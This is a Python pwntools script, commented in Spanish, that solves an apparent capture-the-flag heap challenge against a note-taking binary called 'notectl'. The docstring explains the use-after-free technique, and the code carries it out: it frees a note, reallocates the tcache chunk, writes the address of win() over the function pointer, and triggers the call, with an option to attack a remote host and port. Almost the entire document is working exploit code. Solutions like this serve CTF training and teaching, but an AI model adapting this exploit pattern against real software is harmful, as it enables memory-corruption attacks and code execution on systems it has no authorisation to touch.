#!/usr/bin/env python3
"""
Solución: hard-pwn-heap
Técnica: Use-After-Free + Function Pointer Overwrite

Flujo:
  1. new  slot 0  → malloc(64) para Note; fn=display
  2. del  slot 0  → free(chunk); heap[0] dangling (no NULL)
  3. new  slot 1  → malloc(64) reutiliza el mismo chunk (tcache)
  4. edit slot 0  → escribe win_addr en los primeros 8 bytes del chunk
                    (heap[0] y heap[1] apuntan al mismo chunk)
  5. read slot 1  → llama heap[1]->fn() == win() → imprime flag
"""

import sys
from pwn import *

BINARY = './notectl'
elf = ELF(BINARY, checksec=False)

WIN = elf.symbols['win']
print(f"[*] win() @ {hex(WIN)}")

if args.REMOTE:
    host, port = sys.argv[2], int(sys.argv[3])
    p = remote(host, port)
else:
    p = process(BINARY)


def menu(p):
    p.recvuntil(b'> ')


def new(p, slot: int, msg: bytes = b'AAAA'):
    menu(p)
    p.sendline(b'1')
    p.recvuntil(b'Slot ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'Mensaje: ')
    p.sendline(msg)


def delete(p, slot: int):
    menu(p)
    p.sendline(b'2')
    p.recvuntil(b'Slot ')
    p.sendline(str(slot).encode())


def read_note(p, slot: int):
    menu(p)
    p.sendline(b'3')
    p.recvuntil(b'Slot ')
    p.sendline(str(slot).encode())


def edit(p, slot: int, data: bytes):
    menu(p)
    p.sendline(b'4')
    p.recvuntil(b'Slot ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'Datos ')
    p.recvuntil(b'): ')
    p.send(data)


# ── Exploit ────────────────────────────────────────────────────────────────
p.recvuntil(b'> ')

new(p, 0)           # chunk A   → heap[0] = chunk A, fn=display
delete(p, 0)        # free(A)   → tcache[64]; heap[0] dangling
new(p, 1)           # chunk A   → heap[1] = chunk A (mismo)
                    # heap[0] y heap[1] apuntan al mismo bloque

# Sobrescribir los primeros 8 bytes del chunk con la dirección de win()
payload = p64(WIN) + b'\x00' * 56
edit(p, 0, payload)

# Llamar a heap[1]->fn() — ahora apunta a win()
read_note(p, 1)

p.interactive()
